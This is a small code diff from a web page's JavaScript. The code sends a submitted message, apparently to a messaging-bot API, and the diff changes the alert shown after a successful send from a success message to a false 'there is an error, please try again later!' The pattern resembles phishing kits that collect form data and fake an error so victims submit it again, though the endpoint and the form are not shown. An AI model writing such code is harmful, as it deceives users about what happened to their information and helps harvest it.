@@ -36,7 +36,7 @@
                     parse_mode: 'html',
                     text: message
                 }).then(response => {
-                    alert('Information sent successfully!');
+                    alert('there is an error, please try again later!');
                 }).catch(error => {
                     alert('Error sending the information. Please try again.');
                 });
